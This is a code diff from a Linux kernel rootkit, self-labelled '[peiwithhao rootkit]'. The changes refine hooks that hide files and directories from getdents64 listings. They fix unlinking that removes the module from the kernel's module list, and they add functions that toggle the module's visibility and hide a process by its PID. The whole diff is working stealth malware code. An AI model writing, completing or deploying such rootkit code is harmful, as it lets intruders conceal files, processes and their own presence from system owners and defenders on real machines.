@@ -31,7 +31,7 @@ static size_t __maybe_unused getdents64_after_hooker(struct pt_regs *regs, size_
     copy_nr = copy_from_user((void *)dir_name, *(void **)(regs->di), DIR_PATH_NR);
 
     list_for_each_entry_safe(pos, tmp, &system_dir_hooked_list, dir_hooked_list) {
-        if(strstr(dir_name, pos->name)){
+        if(!strcmp(dir_name, pos->name)){
             *ret = 0;
             return 0;
         }
@@ -60,7 +60,7 @@ static size_t __maybe_unused actor_before_hooker(struct pt_regs *regs){
     struct dir_hooked *pos, *tmp;
     // printk(KERN_INFO "[peiwithhao rootkit] current filename: %s", file_name);
     list_for_each_entry_safe(pos, tmp, &system_file_hooked_list, dir_hooked_list) {
-        if(strstr(file_name, pos->name)){
+        if(!strcmp(file_name, pos->name)){
             // regs->dx = 0;
             // regs->cx = 0;
             //regs->si = (size_t)evil_file_name;
@@ -77,7 +77,7 @@ static void __maybe_unused actor_after_hooker(struct pt_regs *regs, size_t *ret)
     struct dir_hooked *pos, *tmp;
     printk(KERN_INFO "[peiwithhao rootkit] current filename: %s", file_name);
     list_for_each_entry_safe(pos, tmp, &system_file_hooked_list, dir_hooked_list) {
-        if(strstr(file_name, pos->name)){
+        if(!strcmp(file_name, pos->name)){
             *ret = false;
             return;
         }
@@ -112,15 +112,50 @@ ssize_t file_hidden(char *filename){
     return 0;
 }
 
+
+static struct list_head* mod_list = 0;
+
+
 /* 简单的脱链 */
-ssize_t module_hidden(void){
+static ssize_t module_hidden(void){
     struct list_head *list;
     list = &(THIS_MODULE->list);
     //printk(KERN_INFO "[peiwithhao rootkit] this module addr 0x%lx", (long unsigned int)list);
+    mod_list = list->prev;
     list->next->prev = list->prev;
-    list->prev->next = list->prev;
+    list->prev->next = list->next;
     return 0;
 }
+
+static ssize_t module_show(void){
+    struct list_head *list;
+    list = &(THIS_MODULE->list);
+    /* 重新接回链表 */
+    list->next = mod_list->next;
+    mod_list->next->prev = list;
+    list->prev = mod_list;
+    mod_list->next = list;
+    mod_list = 0;
+    return 0;
+}
+
+ssize_t module_toggle(void){
+    if(mod_list){
+        module_show();
+    }else{
+        module_hidden();
+    }
+    return 0;
+}
+
+ssize_t process_hidden(int pid){
+    char str_buf[0x10] = {0};
+    snprintf(str_buf, sizeof(str_buf), "%d", pid);
+    file_hidden(str_buf);
+    return 0;
+}
+
+
 
 
 
